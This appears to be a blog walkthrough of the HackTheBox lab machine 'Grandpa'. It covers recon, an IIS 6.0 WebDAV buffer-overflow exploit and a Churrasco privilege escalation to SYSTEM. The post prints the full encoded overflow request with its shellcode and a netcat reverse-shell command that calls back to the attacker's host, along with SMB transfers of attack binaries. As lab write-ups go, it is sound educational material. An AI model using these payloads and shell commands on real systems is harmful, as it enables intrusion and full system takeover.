---
layout: post
title: "HTB: GRANDPA (10.10.10.14)"
description: "Grandpa is an easy windows box from HackTheBox similar in style to Granny but with a twist. I will find a buffer overflow vulnerability on IIS 6.0 which will give me my initial foothold on the box. For privesc I will use juicy potato to exploit the box and get admin privileges"
tags: [HTB, HackTheBox, Grandpa, buffer overflow, Juicy Potato, Churrasco, WebDAV, davtest, IIS 6.0, SeImpersonatePrivilege, ]
image: "/assets/img/grandpa/feature.png"
---
## RECON
### Nmap

As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.

```sh
┌─[george@parrot]─[~/HTB/boxes/grandpa]                                                                                                                                                                                                                       
└──╼ $ sudo nmap -p- --min-rate 10000 -oA nmap/allports 10.10.10.14                                                                                                                                                                                           
[sudo] password for george:                                                                                                                                                                                                                                   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-14 03:09 EAT                                                                                                                                                                                               
Nmap scan report for 10.10.10.14                                                                                                                                                                                                                              
Host is up (0.21s latency).                                                                                                                                                                                                                                   
Not shown: 65534 filtered tcp ports (no-response)                                                                              
PORT   STATE SERVICE                                                                                                           
80/tcp open  http                      

Nmap done: 1 IP address (1 host up) scanned in 18.17 seconds                                                                   
┌─[george@parrot]─[~/HTB/boxes/grandpa]        
└──╼ $ sudo nmap -p80 -sC -sV -oA nmap/grandpa 10.10.10.14      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-14 03:10 EAT
Nmap scan report for 10.10.10.14
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan:
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Sat, 14 Oct 2023 00:11:26 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
| http-methods:
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.39 seconds
```
From the result we only see one port open. I also not some risky allowed methods.

### TCP Port 80 (HTTP)

Visiting the page I get an error website is under Construction.

![TCP Port 80](/assets/img/grandpa/port80.png)

`gobuster` doesnt find much as well except for empty directories

```sh
┌─[george@parrot]─[~/HTB/boxes/granny]                                                                                                                                                                                                                        
└──╼ $ gobuster dir -u http://10.10.10.15/ -w /opt/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -x asp,aspx                                                                                                                             
===============================================================                                                                                                                                                                                               
Gobuster v3.0.1                                                                                                                                                                                                                                               
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                                                                                                                                                               
===============================================================                                                                                                                                                                                               
[+] Url:            http://10.10.10.15/                                                                                                                                                                                                                       
[+] Threads:        30                                                                                                                                                                                                                                        
[+] Wordlist:       /opt/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt                                                                                                                                                                         
[+] Status codes:   200,204,301,302,307,401,403                                                                                                                                                                                                               
[+] User Agent:     gobuster/3.0.1                                                                                                                                                                                                                            
[+] Extensions:     aspx,asp                                                                                                                                                                                                                                  
[+] Timeout:        10s                                                                                                                                                                                                                                       
===============================================================                                                                                                                                                                                               
2023/10/14 00:57:38 Starting gobuster                                                                                                                                                                                                                         
===============================================================                                                                                                                                                                                               
/images (Status: 301)                                                                                                                                                                                                                                         
/Images (Status: 301)                                                                                                                                                                                                                                         
/IMAGES (Status: 301)                                                                                                                                                                                                                                         
/_private (Status: 301)                                                                                                                                                                                                                                       
===============================================================                                                                                                                                                                                               
2023/10/14 02:45:40 Finished                                                                                                                                                                                                                                  
===============================================================
```

Since there is a WebDAV protocol running on the server we can use the `davtest` tool to scan for accepted file extensions we can upload on the server.

Web Distributed Authoring and Versioning or WebDAV is a protocol whose basic functionality includes enabling users to share, copy, move and edit files through a web server.

```sh
┌─[george@parrot]─[~/HTB/boxes/grandpa]                                                                                                                                                                                                                       
└──╼ $ davtest -url http://10.10.10.14                                                                                                                                                                                                                        
********************************************************
 Testing DAV connection                                                                                                        
OPEN            SUCCEED:                http://10.10.10.14                                                                     
********************************************************
NOTE    Random string for this session: Ynem_Q1BDxJFdo                                                                         
********************************************************                                                                       
 Creating directory                                                                                                            
MKCOL           FAIL                                                                                                                                                                                                                                          
********************************************************                                                                                                                                                                                                      
 Sending test files                                                                                                                                                                                                                                           
PUT     txt     FAIL                                                                                                                                                                                                                                          
PUT     pl      FAIL                   
PUT     php     FAIL                                                                                                           
PUT     aspx    FAIL                                                                                                                                                                                                                                          
PUT     jsp     FAIL                                                                                                                                                                                                                                          
PUT     jhtml   FAIL                                                                                                                                                                                                                                          
PUT     cfm     FAIL                                                                                                                                                                                                                                          
PUT     shtml   FAIL                                                                                                           
PUT     asp     FAIL                                                                                                           
PUT     cgi     FAIL
PUT     html    FAIL

********************************************************
/usr/bin/davtest Summary:
```
Seems we cannot upload any file type on the server.

## Shell as network service
### IIS 6.0

I did some research and found that there is a `Buffer overflow` in the `ScStoragePathFromUrl` function in the `WebDAV` service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 which allows remote attackers to execute arbitrary code via a long header beginning with ``"If:``

I also found [this](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269) python script which was written in python2 but still works.

I will listen for incoming connections with `nc` on one terminal and run the script on the other.

```sh
┌─[✗]─[george@parrot]─[~/HTB/boxes/grandpa]
└──╼ $ python shell.py 10.10.10.14 80 10.10.16.7 9001
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
```

And on my `netcat` terminal we get a connection, sweet!

```sh
└──╼ $ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.14] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>

```
## Shell as nt authority\system
### Enumeration

Whenever I get shell on any box I always start by checking the privileges assigned to that user.

```sh
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```
In this case I note I have `SeImpersonatePrivilege`. Awesome, I will attempt to run a `potato` exploit to privesc.

[Rotten potato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) will not work since we are not in a metasploit shell hence I am left with `juicy potato`

### Juicy Potato

Juicy Potato is a local privilege escalation tool created by Andrea Pierini and Giuseppe Trotta to exploit Windows service accounts’ impersonation privileges.

The tool takes advantage of the SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege if enabled on the machine to elevate the local privileges to System. Normally, these privileges are assigned to service users, admins, and local systems — high integrity elevated users.

If the machine is running IIS or SQL services, these privileges will be enabled by default.

To run this tool we will need `powershell` but the box is a Windows server 2003 hence I will use [Churrasco](https://github.com/Re4son/Churrasco/) and `nc.exe` to get a shell on the box

### Churrasco

I will set up an smbserver on my box with `impacket-smbserver`

```sh
┌─[george@parrot]─[~/HTB/boxes/grandpa/share]                                                                                 
└──╼ $ sudo impacket-smbserver george $(pwd)                                                                                  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation                                                                      

[*] Config file parsed                                         
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0                                                         
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0                                                         
[*] Config file parsed                                         
[*] Config file parsed                                         
[*] Config file parsed                      
```
Next I will locate the netcat windows binary and copy it to the shared folder then I will clone the github repo into my opt directory and copy the Churrasco.exe binary into the same folder.

```sh
┌─[george@parrot]─[~/HTB/boxes/grandpa/share]
└──╼ $ locate nc.exe
/opt/Seclists/Web-Shells/FuzzDB/nc.exe
┌─[george@parrot]─[~/HTB/boxes/grandpa/share]
└──╼ $ cp /opt/Seclists/Web-Shells/FuzzDB/nc.exe .
```
Afterwords I will look for a writable folder on the box and copy the files to that folder.

This was a more trial and error kind of way. So finally I got this folder which had read/write permissions `C:\ADFS`

### Shell
I copied both churrasco which i renamed to gee.exe for ease of typing :) and the nc.exe to the `ADFS` folder

```sh
copy \\10.10.16.7\george\gee.exe .
copy \\10.10.16.7\george\gee.exe .
        1 file(s) copied.

copy \\10.10.16.7\george\nc.exe .
copy \\10.10.16.7\george\nc.exe .
        1 file(s) copied.
```
On my parrot box I will open a netcat listener on port 9002 and execute the Churrasco.exe on the box as below

```sh
.\gee.exe -d "c:\adfs\nc.exe -e cmd.exe 10.10.16.7 9002"
.\gee.exe -d "c:\adfs\nc.exe -e cmd.exe 10.10.16.7 9002"
/churrasco/-->Current User: NETWORK SERVICE
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x72c
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x724
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```
On my `nc` listener I have a Callback, and we are `nt authority\system`

```sh
┌─[✗]─[george@parrot]─[~/HTB/boxes/grandpa/share]
└──╼ $ nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.14] 1038
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system

C:\WINDOWS\TEMP>
```
And thats the box. Thank you all for taking your time to read my blog post, stay tuned for the next!

Happy hacking!
